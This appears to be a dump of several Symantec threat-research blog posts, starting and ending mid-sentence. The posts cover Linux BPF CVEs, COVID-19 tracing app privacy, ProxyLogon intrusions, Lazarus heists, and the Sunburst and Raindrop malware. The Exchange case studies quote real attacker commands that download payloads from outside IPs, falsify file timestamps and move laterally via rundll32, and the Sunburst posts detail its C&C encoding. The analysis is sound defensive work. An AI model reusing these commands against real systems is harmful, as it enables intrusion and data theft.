any protection against out-of-bounds speculation when performing pointer arithmetic on such pointer types. The second reported issue, CVE-2020-27171, can reveal content from a 4 GB range of kernel memory around some of the structures that are protected. This issue is caused by a numeric error in the Spectre mitigations when protecting pointer arithmetic against out-of-bounds speculations. Unprivileged BPF programs running on affected systems can exploit this error to execute speculatively out-of-bounds loads from a 4 GB range of kernel memory below the protected structure. Like CVE-2020-27170, this can also be abused to reveal contents of kernel memory via side-channels. A detailed technical description of these issues can be found in the following announcements: The most likely scenario where these vulnerabilities could be exploited is in a situation where multiple users have access to a single affected computer – as could be the case in workplace situations etc. In this scenario, any of the unprivileged users could abuse one of the identified vulnerabilities to extract contents of the kernel memory to locate secrets from other users. The bugs could also potentially be exploited if a malicious actor was able to gain access to an exploitable machine via a prior step – such as downloading malware onto the machine to achieve remote access – this could then allow them to exploit these vulnerabilities to gain access to all user profiles on the machine. The patches for these bugs were first published on March 17, 2021 and are included in the following Linux kernel releases: The following Linux distributions have deployed fixes for the vulnerabilities outlined. Find more information at the links below: Version 10.9 (released on March 27, 2021) All users of Linux distributions should check with their vendor to ensure patches have been applied for these vulnerabilities.

    "text": "Unfortunately, in this new COVID-19 era it’s not just our computers we have to protect from infection, but also ourselves and our loved ones. Along with social distancing, wearing a mask, and washing our hands, technology is also playing a part in the fight against the pandemic. COVID-19 contact tracing apps have been deployed by both governments and organizations around the globe. Not all contact tracing apps are equal and an app used by a company to contact-trace its employees while at work can have different objectives than those of an app used by a government to contact-trace its citizens. Any app with tracing functionality should follow best practices when it comes to the collection of data and how that data is stored and used, and there are different rules and regulations relating to this in different parts of the world. This report will analyze 25 popular COVID-19 tracing apps to find out how they do when it comes to security and privacy. However, first, we need to lay out which type of apps we will be looking at and how they work, as well as some of the laws and usage requirements that can shape contact tracing apps. Tracing apps developed and used by governments and ones used by businesses can be for very different use cases. A government app’s intent is to keep track of who a user has been in contact with and to alert users if they have been near a person infected by the virus. An app provided to employees by their employer may be intended to do the same but in a geofenced area, namely the workplace. As well as this it may be needed to trace an infected user’s movements so that the relevant areas can be disinfected. For the purpose of this report we will not be analyzing apps intended for use by employees solely in the workplace and will focus instead on national apps intended for use by the general public. Tracing apps intended for use in the European Economic Area (EEA) must be in compliance with the General Data Protection Regulation (GDPR). GDPR’s stringent privacy and data protection principles offer a comprehensive, functional blueprint for digital system design and, as such, may be viewed as a benchmark to aim for, even for apps in regions of the world that do not have to comply with the regulations. However, because this is often not the case we will first compare the EEA tracing apps, then the non-EEA apps before finally comparing one set to the other. COVID-19 tracing apps use Bluetooth Low Energy (BLE) signals, sent by mobile devices, to keep track of other people and devices the user comes into contact with. If a person they come into contact with tests positive, the app alerts them. Equally, if the user tests positive for COVID-19, the app alerts everyone that they came into contact with. If done properly, COVID-19 tracing apps have the ability to protect and prevent the spread of the Coronavirus. If not done properly, COVID-19 tracing apps have the ability to put users’ privacy and safety at risk. COVID-19 tracing app users should expect to be assigned a randomly generated identifier thatdoes not reveal any personal information about them. Furthermore, the app should only be scanning and sending BLE signal data to its servers, but not to any other destinations. Depending on the use case of a particular app, a range of information may be needed for it to function as intended. For example, if the app is used by a business to trace its employees it may be set up so as to activate and start contact-tracing only within a certain GPS coordinate and conversely to stop once outside those coordinates without recording or sending any information. Furthermore, Wi-Fi data may be needed to justify cleaning/disinfection actions as a result of an infection notification. However, in any scenario, the user must be notified of such data collection. Any data the app is collecting must be clearly and accurately stated in the privacy policy and only collected with the user’s acknowledgment, or with their formal consent where local law so requires. On the other hand, such functionality would not usually be necessary for a nation-wide, publicly available, contact-tracing app The joint Google and AppleExposure Notification System, designed to be used by developers of COVID-19 tracing apps, is a framework that does the legwork \"for public health authorities to supplement their existing contact tracing operations with technology without compromising on the project’s core tenets of user privacy and security.” While this is a step in the right direction for users' privacy, it seems that few app developers have adopted the framework. Of all the apps we analyzed, we only saw one that used the earlier version of this system. The cloud-based Symantec App Analysis service performed static, dynamic, and behavioral app analysis for nation-wide, COVID-19 tracing apps publicly available from 31 different countries on the iOS and Android platforms. App analysis identifies apps following known security best practices and apps that impact and increase user privacy, security, and risk. App behaviors impacting privacy, security, and risk: App behaviors that follow best security practices: Generally, runtime permission models by Android and iOS protect users from apps collecting private data without their knowledge. That being said, there are some issues with the permission model that complicate privacy. In particular, Android COVID-19 contact tracing apps use Bluetooth technology. Android devices group Bluetooth permissions and location/GPS services together, requiring the app and app developer to request and gain access to GPS locations. We analyzed COVID-19 tracing apps available to the public from 31 different countries, identifying app behaviors impacting user privacy and security. Eight of the COVID-19 tracing apps were from countries within the EEA. For these apps we found the following: The remaining 23 COVID-19 tracing apps, which were from non-EEA countries, did noticeably worse: Overall, the diagnosis is grim. Our findings found over half of all countries’ COVID-19 tracing apps access device data containing personal information and fail to protect user data in transit. Our findings suggest that if you are using a COVID-19 tracing app from a non-EEA country, compared to one from an EEA nation, your risk increases by a factor of two. However, not all non-EEA apps performed quite as badly, as detailed in the following Examples section. The COVIDSafe tracing app from the Australian Department of Health hits the security sweet spot when it comes to COVID-19 tracing app. The privacy policy (https://covidsafe.gov.au/privacy-policy.html) clearly explains how and what personal information is collected and aligns with our analysis of the app. Furthermore, the in-app runtime permissions clearly state the reasons for requesting the privileges, as seen when asking for Bluetooth tracking: [{\"description\": \"COVIDSafe exchanges Bluetooth signals with nearby phones running the same app. These signals contain an anonymized ID, which is encrypted and changes continually to ensure your privacy.\"}] Meanwhile, at the other end of the spectrum, StopKorona! is a COVID-19 tracing app for Android and iOS from the Ministry of Health of the Republic of North Macedonia. It claims to be a \"mobile app developed based on the best global practices for the prevention and control of the Coronavirus. The app is intended to trace exposure with potentially infected persons, by the detection of the distance between mobile devices/applications by using Bluetooth technology.\" Furthermore, StopKorona! claims that: \"The only data related to you is your mobile telephone number, stored on a safe server managed by the Ministry of Health, to prevent the spreading of the virus.\" We found that the collected data claimed by the Ministry of Health is accurate. What we found inaccurate is the claim that the data is sent securely. Often we discover in analysis app developers disabling the security or integrity of network connections. This commonly happens when the servers receiving the data are not configured correctly, or the app libraries are not configured correctly. In any case, this disabling of validation of SSL certificate authorities (CAs) is intentional. Furthermore, if you were able to connect to the servers receiving your private data in a browser on the desktop, you would see a broken lock next to the URL showing the connection sending your private data is insecure. For mobile apps, there is no such lock visible to the user. App developers know this, often using it to pass the test of security while avoiding taking the time to properly and securely configure private data sent over the network.

    "text": "Blog updated March 11: Case studies detailing post-compromise activity seen by Symantec added, along with additional IoCs Blog updated March 9: IoCs, additional signatures, and pre-exploitation process diagram added. Users of Microsoft Exchange Server are advised to update to the latest version immediately, as a growing number of attackers are attempting to exploit four recently patched zero-day vulnerabilities in the software. Microsoft released emergency patches last week (March 2) for the four vulnerabilities, which were being exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, since then it has been reported that multiple threat actors have been rushing to exploit these vulnerabilities in Exchange Server. Two of the vulnerabilities (CVE-2021-26855 and CVE-2021-27065) and the technique used to chain them together for exploitation have been given the name“ProxyLogon” by security company DevCore. Successful exploitation of ProxyLogon allows attackers to gain a foothold on a targeted network, potentially leading to further compromise and data exfiltration. Symantec customers are protected from attacks exploiting these vulnerabilities. Microsoft releasedan out-of-band patchto address the vulnerabilities in Exchange Server on March 2, 2020. The versions impacted are Exchange Server 2013, 2016, and 2019. Security firm Volexity, which Microsoft credited in its security alert detailing the vulnerabilities, said it first saw attackers exploiting the bugs on January 6, 2021. Successful exploitation of these vulnerabilities allows an unauthenticated attacker to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations. The four zero-day vulnerabilities that Microsoft released emergency patches for are: The following diagram shows an attack chain that an attacker could employ to gain initial access to data. Hafnium, which Symantec tracks as Ant, was the group first seen exploiting the vulnerabilities in Exchange Server,according to Microsoft. It said at the time that Ant was exploiting the zero days to carry out “limited and targeted attacks.” Microsoft said Ant used the vulnerabilities “to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments.” Microsoft stated with “high confidence” that the group was state-sponsored and operating out of China. It also said the group principally attacked targets in the U. S., including infectious disease researchers, law firms, educational institutes, defense contractors, policy think tanks, and NGOs. Security firm Veloxityalso said the group was seen deploying web shells on infected systems to allow for remote access. Among the web shells Veloxity said it saw deployed were China Chopper variants and ASPXSPY. Veloxity also reported seeing the group carry out post-compromise activity such as credential dumping, lateral movement via PsExec, and archiving (likely in preparation for exfiltration of data). Microsoftalso reportedthat Ant deployed post-compromise tools such as Covenant, PowerCat, and Nishang. It is likely the group was using publicly available web shells and post-compromise tools in order to make attribution of the activity more difficult. No, since Microsoft released the emergency patches for these vulnerabilities on March 2, attacks attempting to exploit these vulnerabilities have escalated, with “multiple malicious actors beyond Hafnium” attempting to target unpatched systems, according to Microsoft. The initial attacks carried out by Ant appear to have been targeted, but the large number of threat actors now attempting to exploit these vulnerabilities mean these attacks are now more indiscriminate in nature. While Symantec customers are protected from attacks attempting to exploit those vulnerabilities, all users of Exchange Server are advised to update to the most recent version immediately. Microsoft has alsoreleased a detection toolthat allows you to scan your Exchange Server logs to determine if your server was compromised. The Cybersecurity and Infrastructure Security Agency (CISA) in the U. S. has advised that all users of Exchange Server scan their systems using Microsoft’s tool, as well as issuing anEmergency Directiveto instruct all federal agencies to immediately update their Exchange servers. Symantec researchers have observed post-compromise activity on a small number of customer machines, where attackers’ initial point of entry appears to have been through exploiting the vulnerabilities in Microsoft Exchange. In two cases, Symantec researchers observed activity prior to the release of Microsoft’s patches on March 2. In one victim, a telecoms company in the Middle East, we saw activity as far back as January 2021. China Chopper web shells were present on this victim’s network on January 13. China Chopper web shells were used by Ant (aka Hafnium) in the initial attacks leveraging these vulnerabilities according toreports by Veloxity. On January 29, a suspicious PowerShell command was executed to download files from a domain masquerading as a popular cloud hosting provider. A few days later, on February 1, a suspicious command was executed to create a scheduled task, which executed “debug.bat” several hours later. The task was named “test”, which may indicate that the attackers were using this as a way to test scheduled tasks. Some hours later, the attackers ran “net start vdir”, which was used to launch a service that had likely been installed by the attackers. On February 6, a suspicious file (sok.wia) was downloaded by the attackers and was used to establish a connection with a remote host. It is likely this connection was used by the attackers to assist in exfiltration because, shortly afterwards, credential-dumping tool Mimikatz was used to dump credentials from the system. The next day, the attackers again use sok.wia, before creating a scheduled task on a remote server (likely using stolen credentials) to execute a “server.bat” file. The next activity was seen on February 18 when Mimikatz was executed once again, and then on February 19 ProcDump was used to dump Isass to “he.dmp”, which can be used to harvest credentials. Then later, on March 3, a suspicious file was observed in %Temp%\\in.exe, followed by a suspicious file ({71736495-d485-477d-b836-17f0085e0780}.exe) being extracted via the WinRAR archive tool which creates a malicious file in %system%\\inetsrv\\XmlLite.dll. This was the last activity seen on this machine. Another victim, this one operating in the legal sector in Southeast Asia, saw activity on its network beginning on February 28. This was before Microsoft issued patches for the exploited vulnerabilities, but it has been reported by Veloxity that it saw activity ramping up since February 28, so it is possible information about these vulnerabilities had been leaked in the cyber crime fraternity by this time. The first activity on this machine on February 28 was a command used to dump credentials that was executed via the w3wp.exe process. On the same day ProcDump was used to dump Isass, which can be used to harvest credentials. The next day, March 1, a file called ‘uawmiver.exe’ was executed to bypass user account control (UAC). This was used to execute two batch files called “set.bat” and “set1.bat”. On March 3, a command was used to execute another unknown batch file, which was downloaded by bitsadmin from a remote host: CSIDL_SYSTEM\\bitsadmin.exe /rawreturn /transfer getfile http://89.34.111.11/3.avi CSIDL_PROFILE\\public\\2.bat We then saw obfuscated PowerShell commands being executed and used to download a file from a remote host. (new-object System. Net. WebClient). DownloadFile('hxxp://86.105.18.116/news/code','C:\\users\\public\\opera\\code') The next day, March 4, another PowerShell command was executed that searched for \"layout.aspx\" and \"iistart.aspx\". The last access and creation times were modified to August 21, 2017. powershell.exe -command dir |where {$_.name -eq 'layout.aspx' -or $_.name -eq 'iistart.aspx' } | foreach-object { $_. LastWriteTime = '2017-08-21 20:26:57';$_. LastAccessTime = '2017-08-21 20:26:57'; $_. CreationTime = '2017-08-21 20:26:52' } This was likely done to help conceal the malicious files and thwart any incident response investigations. 7-Zip was then used to extract the contents of a ZIP archive (current.zip) that was uploaded to the Exchange server by the attackers, before the file “current.exe” was executed, which injected CobaltStrike beacon to a newly-created “svchost.exe” process for backdoor access. Several hours after this, ntdsutil was used to dump credentials once again. Following this, a file called \"mv.exe\", which is likely Mimikatz, was executed to dump credentials. This is followed by ProcDump being used to dump lsass to harvest additional credentials. Shortly after this, an unknown file \"ccsvchst.exe\" was executed, which passes a collected hash. Finally, the attackers launched the publicly available \"secretsdump\" tool, to dump credentials stored in the registry. Then, on March 8, the attackers ran Mimikatz to try to dump credentials again. This was the last activity seen on this machine. We also observed some post-compromise activity in a small number of other organizations since Microsoft issued their patches on March 2, when activity ramped up significantly as it is believed a large number of threat actors were rushing to exploit these vulnerabilities. Some of the tools we saw used in post-compromise activity in those impacted since March 2 include: In one case we also saw the attackers deleting shadow copies from infected machines, which is activity we typically see when attackers are preparing to carry out a ransomware attack, though we did not observe ransomware deployed on the machine. The extensive use of living-off-the-land and open-source tools and tactics by the attackers leveraging these vulnerabilities make attribution of these attacks difficult and means that a wide number of different threat actors may be responsible for these attacks. With activity exploiting these vulnerabilities seen by Symantec as recently as March 9, these attacks are ongoing, and all users of Microsoft Exchange Server are urged to scan their environment and apply patches immediately.

    "text": "The U. S. government hascharged three men in relation to a string of financially motivated cyber attackslinked to the North Korean Lazarus (aka Appleworm) group. The attackers stole approximately $1.3 billion from a range of financial institutions and cryptocurrency exchanges. In a second case, a Canadian-American citizen has pleaded guilty to involvement in a money laundering scheme linked to heists organized by the Lazarus group. The charges relate to a number of financially motivated attacks, including several investigated by Symantec, a division of Broadcom (NASDAQ: AVGO). Lazarus was linked to a 2016 attack thatstole US$81 million from the Bangladesh Central Bank and a number of other attacks against banks in Asia and South America. The attacks prompted an alert by payments network SWIFT, after it was found that the attackers had used malware to cover up evidence of fraudulent transfers. In order to steal such massive sums, the attackers deployed relatively sophisticated malware, most notably Trojan. Banswift, which was used to wipe evidence of fraudulent transactions. Banswift shared code with an older Lazarus tool called Backdoor. Contopee. Contopee, along with two other pieces of Lazarus malware, Backdoor. Fimlis and Backdoor. Fimlis. B, were already being used in limited targeted attacks against the financial sector in South-East Asia. Financially motivated attacks continued into 2017,when dozens of organizations were targeted through watering-hole attacks involving a previously unseen piece of malware. The attackers compromised websites likely to be visited by staff at targeted organizations and used a custom exploit kit to deliver malware to selected targets. The exploit kit was configured to only infect visitors from approximately 150 different IP addresses. These IP addresses belonged to 104 different organizations located in 31 different countries, most of which were banks. While the malware used in these attacks (Downloader. Ratankba) had been previously unseen, further analysis by Symantec uncovered strong links between this tool and known Lazarus tools. Lazarus was subsequently implicated in theWannaCry ransomware attacks. The ransomware incorporated the leaked EternalBlue exploit that used two known vulnerabilities in Windows (CVE-2017-0144and CVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within a matter of hours, the malware had infected hundreds of thousands of computers worldwide. The attack had the potential to be highly profitable but it was poorly executed. WannaCry was supposed to generate a unique Bitcoin wallet address for each infected computer but, due to a bug, it failed to do so and instead defaulted to three hardcoded Bitcoin addresses for payment. This meant the attackers had no way of knowing which victims had paid using the hardcoded addresses. The attackers also included a “killswitch” in the malware. This was the address of a non-existent domain. WannaCry was designed to check if the domain was live and, if it was, it would cease installing. However, it was quickly found by a security researcher who registered the domain themselves, thus limiting the damage. The group’s interest in financially motivated attacks persisted and, in 2018, evidence appeared of its involvement in attacks on ATM networks in Africa and Asia. The operation, known as FASTCash, allowed the group to effectively empty ATMs of cash. The attacks began with breaches of the targeted bank’s network in order to gain access to the switch application server that handled ATM transactions. Malware (Trojan. Fastcash) was installed on the server and used to intercept fraudulent cash withdrawal requests and send falsified approval responses, allowing cash to be withdrawn. In a related announcement, the FBI, the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasuryreleased details on AppleJeus, malware that was used in a series of attacks on cryptocurrency exchanges. The malware is designed to masquerade as legitimate cryptocurrency trading applications. At least seven different versions of AppleJeus have been discovered, each of which is designed to target a different cryptocurrency trading application. The following trading platforms were targeted by the malware: Initially the malware was spread using fake versions of the legitimate trading platform websites. However, later the attackers switched vectors, relying on phishing, social networking, and social engineering techniques to fool victims into downloading the malware. The indictment is the latest in a series of charges laid out against state-sponsored espionage actors by authorities in the U. S. and comes on the back ofa 2018 indictmentagainst one of the men named in this week’s announcement. The charges are a timely reminder of the ability of law enforcement to investigate attacks that originate far beyond national borders.

    "text": "In ourprevious blogwe described how the attackers controlled the Sunburst malware, and detailed a variety of commands that will result in data being sent to the threat actors. The next technique to discuss is how Sunburst sends this data to the attackers. If data is being sent to the attacker as a result of a command, instead of performing a HTTP(S) GET request, something we described in our last blog, Sunburst initiates a HTTP(S) POST request. Sunburst uses randomly generated URL paths for HTTP(S) POST requests that are different from HTTP(S) GET requests. If the data to send is greater than 10,000 bytes, the URL path will be as follows: A Content-Type header is set to application/octet-stream and the POST data follows. The POST data consists of the data to send UTF8 encoded, concatenated with the last error code, concatenated with the userid, and subsequently compressed. Every byte of the compressed blob is then summed and the lowest byte of the sum value is used as a key. The compressed blob is XOR’d by the key byte and the key byte is prepended to the encrypted data. If the data to send is less than, or equal to, 10,000 bytes, the URL path will take one of two forms as follows: Further, instead of sending the encrypted data directly, as when the data is greater than 10,000 bytes, the data is steganographically sent in a faux JSON blob. The JSON blob contains the following fields: The encrypted data to send is broken into multiple variable sized chunks. The size of each chunk is randomly determined, but generally will go from smaller to larger. If the randomly chosen size is 0, a random chunk between 16 and 28 bytes is generated instead and the Timestamp value is AND’d with the value 18446744073709551613, which more importantly sets the second bit to 0. Each chunk is then encoded and added to the JSON blob and sent as the HTTP(S) POST data with a Content-Type header set to application/json. On receipt, the attacker will need to decode and concatenate all the Message chunks, skipping junk chunks where the Timestamp second bit is not set. This blog is the final installment of our analysis series concerning the command and control (C&C) process used by the actors behind the SolarWinds attacks. Previous entries have covered how the attackers used Sunburst todisable security software and avoid detection, the malware's use of arare domain generation algorithm(DGA) to generate domain names to contact for C&C purposes, and Sunburst's control flow anduse of IP address values as commands. This final blog, detailing how the malware sends data back to the attackers, rounds out a comprehensive overview of Sunburst’s C&C processes. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered an additional piece of malware used in the SolarWinds attacks which was used against a select number of victims that were of interest to the attackers. Raindrop (Backdoor. Raindrop) is a loader which delivers a payload of Cobalt Strike. Raindrop is very similar to the already documented Teardrop tool, but there are some key differences between the two. While Teardrop was delivered by the initial Sunburst backdoor (Backdoor. Sunburst), Raindrop appears to have been used for spreading across the victim’s network. Symantec has seen no evidence to date of Raindrop being delivered directly by Sunburst. Instead, it appears elsewhere on networks where at least one computer has already been compromised by Sunburst. In one victim, in early July 2020, Sunburst was installed through the SolarWinds Orion update, as has been well documented. Two computers were compromised. The following day, Teardrop was subsequently installed on one of these computers. That computer was found to have an active directory query tool, as well as a credential dumper designed specifically for SolarWinds Orion databases. The credential dumper was similar to, but not the same as, theopen source Solarflaretool. Eleven days later, on a third victim computer in the organization, where no previous malicious activity had been observed, a copy of the previously unseen Raindrop was installed under the name bproxy.dll. This computer was running computer access and management software. The attackers could have used this software to access any of the computers in the compromised organization. One hour later, the Raindrop malware installed an additional file called \"7z.dll\". We were unable to retrieve this file, however, within hours a legitimate version of 7zip was used to extract a copy of what appeared to be Directory Services Internals (DSInternals) onto the computer. DSInternals is a legitimate tool which can be used for querying Active Directory servers and retrieving data, typically passwords, keys, or password hashes. An additional tool called mc_store.exe was later installed by the attackers on this computer. The tool is an unknown PyInstaller packaged application. No further activity was observed on this computer. In a second victim where the Raindrop loader was seen, it was installed in a file called astdrvx64.dll in late May. Several days later, in early June, PowerShell commands were executed on that computer, attempting to execute further instances of Raindrop on additional computers in the organization. \"Invoke-Command -ComputerName REDACTED -ScriptBlock { rundll32 c:\\Packages\\Plugins\\Microsoft. Powershell. DSC\\2.77.0.0\\bin\\TelemetryStatus.dll Tk_CreateItemType}\" \"Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\\windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS. Media.dll TkChangeEventWindow' -ComputerName REDACTED\" In a third victim, where Raindrop was seen, the instance of Cobalt Strike that was extracted did not have a HTTP-based command and control server, but was rather configured to use a network pipe over SMB (\\\\.\\pipe\\protected_storage[REDACTED]). It's possible that in this instance, the victim computer did not have direct access to the internet, and so command and control was routed through another computer on the local network. Raindrop is similar to Teardrop in that both pieces of malware act as a loader for Cobalt Strike Beacon. Raindrop uses a custom packer to pack Cobalt Strike. This packer is different to the one used by Teardrop. Raindrop is compiled as a DLL, which is built from a modified version of 7-Zip source code. The 7-Zip code is not utilized and is designed to hide malicious functionality added by the attackers. The DLL is compiled where the Name file of the Export Directory Table is “\"7-zip.dll\" and the Export Names are: And one of the following, selected at random: The Export Names used seem to overlap with names used by Tcl/Tk projects (seehereandhere). Whenever the DLL is loaded, it starts a new thread from the DllMain subroutine that executes the malicious code. This malicious thread performs the following actions: In order to locate the start of the encoded payload, the packer uses steganography by scanning the bytes starting from the beginning of the subroutine and skipping any bytes until the first occurrence of the following bytes that represent operation codes (opcodes) of interest: .data:0000000180053008 opcodes db 5, 0Dh, 15h, 1Dh, 25h, 2Dh, 35h, 3Dh, 0B8h The malware will then perform the following actions: Although Raindrop is very similar to Teardrop, there are some key differences between the tools. As mentioned previously, Raindrop uses a different packer. The packers differ in the following ways: While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: The discovery of Raindrop is a significant step in our investigation of the SolarWinds attacks as it provides further insights into post-compromise activity at organizations of interest to the attackers. While Teardrop was used on computers that had been infected by the original Sunburst Trojan, Raindrop appeared elsewhere on the network, being used by the attackers to move laterally and deploy payloads on other computers. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "Inour most recent blog on the SolarWinds attacks, we examined the domain generation algorithm (DGA) used to initiate contact with the attackers’ command and control (C&C) servers. The control flow, what happens after that contact is made, is also noteworthy. The control flow of Sunburst varies depending on commands received from the attacker. However, the general control flow can be reconstructed in order to understand how communications would have progressed on machines that were of interest to the attackers. As described in our previous blog, two types of DNS requests are used for initial communications, and both receive DNS replies. The attackers use two fields in the DNS replies: “A records” for control flow and CNAME to hold data on a secondary C&C server. Normally, when querying DNS, a hostname string is provided to be translated into a numeric IP address, e.g., google.com may translate into 142.250.72.238. The IP address is held in the A record of the response. Sunburst parses the A record for IP addresses, but they are not used as IP addresses at all, but instead are actually triggers for different malware behavior. Instead of the attackers selecting random IP addresses to trigger different behaviors, they have selected IP address ranges belonging to Google, Amazon, and Microsoft. These are possibly chosen in order to reduce the chances of detection. Again, these IPs are not used as IP addresses in any way and the actual computer systems with these IP addresses are not contacted by the malware. The IP address value received in the DNS reply represents one of five behaviors depending on the current state: For a typical infection, Sunburst will first send to the C&C server the first 14 characters of the Windows domain name. This will continue for each 14 character chunk, until the entire Windows Domain name is sent. Next, the attackers will instruct Sunburst tosend the current security product statusesand then send information enabling Sunburst to launch a more robust secondary HTTP-based C&C. Within any DNS reply, the attackers can also instead instruct Sunburst to restore security product service registry keys that were previously disabled back to their believed default settings and quit or reset the internal state as if it is a fresh infection. In addition, to facilitate lab environment and sandbox avoidance, if the DNS requests result in a private range IP address, including 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 224.0.0.0/4, fc00::/7, fec0::/10, ff00::/8, Sunburst will also clean up and exit. Victims that were of interest to the attackers would have reached the secondary C&C stage. In this case, the DNS reply would contain a hostname in the CNAME record to be used as a HTTP C&C channel. The CNAME value is checked to see if it starts with http:// or https:// and is prepended with https:// otherwise. Next, Sunburst will perform repeated HTTP GET requests to receive commands, sleeping a variable amount of time between requests. The path portion of the URL always starts with /swip/upd/ followed by randomly selected URL patterns, in the following order. Optionally, one or more of the following: Optionally, followed by one of the following: If no previous string has been selected, one of the following or optionally, one of the following if a previous string has been selected: Optionally, followed by: Also, if the first character in the path is a dot (.), the dot is removed. For example, the following are example URLs that could be used: The final digit before the .xml extension is not a random character, but represents the return code for previous command requests – typically 0 means success and 1 or other values mean error. For the first 16 requests, a different randomly generated path is used each time, but after that it may repeat random generations that it used previously. If data is being sent to the attacker as a result of a command (e.g. sending system information), the path construction will be different and will be covered in a future blog. Sunburst also adds the custom header “If-None-Match:” set to thepreviously described 8-byte useridXOR’d by a randomly generated 8-byte sequence that is appended and then converted into lowercase ASCII hex. After the HTTP GET request is made, Sunburst checks for a valid response from the attacker. The response uses steganography and is a faux, but convincing XML page of data, where only certain fields are utilized by Sunburst. The faux XML data is searched for a sequence of: These sequences are concatenated together with non-hexadecimal characters removed. The first DWORD (4 bytes) of the sequence represents the size of the remaining data, which is validated and then the next byte is an XOR key. The rest of the data is then XOR decrypted by the key byte and then decompressed. After being decompressed, the first character is a number that specifies the action to perform followed by the number of included arguments in the following data for the command: The command number can instruct Sunburst to perform the following behaviors: If no data needs to be sent to the attacker, the above GET request with the return code encoded in the URL filename is sent. If data needs to be sent to the attacker as a result of these commands (e.g. sending system information), the data will be included in the next regular HTTP(S) communication as a POST request or a HEAD request if some error occurred where the data is missing. Details on each of these behaviors and how data is uploaded to the attacker will be covered in an upcoming blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "In the weeks sincenews of the SolarWinds attacks broke, we’ve continued our analysis into the tools used by the attackers. One of the most interesting things we’ve seen is the way the attackers configured their malware in order to contact a command and control (C&C) server via DNS communications. It’s a technique that is rarely used, but there have been some reports of other APT groups such as Crambus (aka Oilrig) using it previously. Sunburst (Backdoor. Sunburst), the malware which was used to Trojanize the SolarWinds Orion software, uses a domain generation algorithm (DGA) to generate domain names to contact for C&C purposes. However, unlike most DGAs, this DGA does not just randomly generate characters. Instead, information is encoded into the text that makes up the generated domain names. By doing so, initial C&C actually happens via DNS, which provides a stealthier level of communications. For each infected computer, Sunburst generates a unique ID, referred to as a userid. The userid is made up of the first active MAC address that is not the loopback address, concatenated with the Windows Domain name of the computer, and then concatenated with the Windows installation UUID, a randomly generated value at Windows installation time stored in HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. These three values are then MD5 hashed and the first 64 bits are XOR’d with the last 64 bits, resulting in a unique 64-bit userid. Because multiple DNS requests will have to be made to transmit all payload information, the attackers require a unique ID to know from which computer the information is coming from. DNS is a distributed protocol, meaning the infected computer does not contact the attacker’s C&C server directly, but instead the DNS request is passed through multiple intermediaries before reaching the attacker DNS server. Only by including the userid within the DNS request will the attackers be able to combine the multiple requests. The DNS lookup will be in one of the following forms: <encoded information>.appsync-api.eu-west-1.avsvmcloud.com <encoded information>.appsync-api.us-west-2.avsvmcloud.com <encoded information>.appsync-api.us-east-1.avsvmcloud.com <encoded information>.appsync-api.us-east-2.avsvmcloud.com The encoded information will be in one of two forms providing the attackers either the Windows domain name of the infected organization or security product statuses and feedback on the infected machine. Initially, after Sunburstchecks for or bypasses security tools and products, the first DNS lookup will occur containing the infected computer’s Windows domain name or a portion thereof, encoded into the C&C domain. The Windows domain is usually a human-readable string representing the name of the organization the machine belongs to, e.g. AcmeA1Corp. The DGA will start by prepending the aforementioned userid with a randomly chosen key byte between 0x81 and 0xFE followed by the userid XOR’d with the key byte. These nine bytes are then encoded in a fashion similar to Base64, resulting in 15 characters. This string of characters is then followed by the Windows domain name, encoded. Because Windows domain names can be up to 253 characters long, Sunburst chooses to segment the Windows domain names into 14 character chunks preceded by the chunk number (where the first chunk number is 0). Windows domain names longer than 14 characters will thus require more than one DNS lookup to provide the entire Windows domain name. Sunburst will also resend previously sent chunks if an error was encountered or, under certain error conditions, set the chunk number to a negative one. The segment chunk number and the Windows domain name are both encoded separately and appended to the encoded userid. These elements form the subdomain of the domain. This domain is queried via DNS, which results in this encoded information reaching the attacker’s DNS server. The attacker can then decode the information and reply with further instructions, which will be covered in a future blog. Sunburst does not automatically generate multiple DNS queries in order to send the entire Windows domain name. Whether Sunburst will send the remaining 14-character segments depends on the response received from the initial DNS query. Because Sunburst was delivered via a supply chain attack, many systems that are not of interest will be infected. By encoding the first 14 characters of the Windows domain name into the first DNS query, the attackers are able to triage infections and only mount second-state attacks on systems of interest - those that have Windows domain names that match organizations they wish to target. Depending on the response to the first DNS lookup, a second DNS lookup may occur that encodes the status of installed security products on the system and information on whether the DNS communication has been successful. First, the userid is XOR’d by the third and second bytes of a timestamp value described below in an alternating fashion before being XOR’d by a randomly chosen key byte between 0x01 and 0x7E that is then prepended to the userid. The first byte thus provides not only the key byte, but informs the attackers if the remaining content will contain the Windows domain name payload (key byte is between 0x81 and 0xFE) or the security product status and feedback payload (key byte is between 0x01 and 0x7E). After the userid, a nibble (half a byte) is used to specify if the security payload information has content (nibble is set to 2) or is blank (nibble is set to 1). This is followed by a timestamp in UTC of when the DNS query was sent, granular to 30-minute increments. The last bit of the timestamp is set to a bit flag representing whether the previous DNS response successfully contained partial or 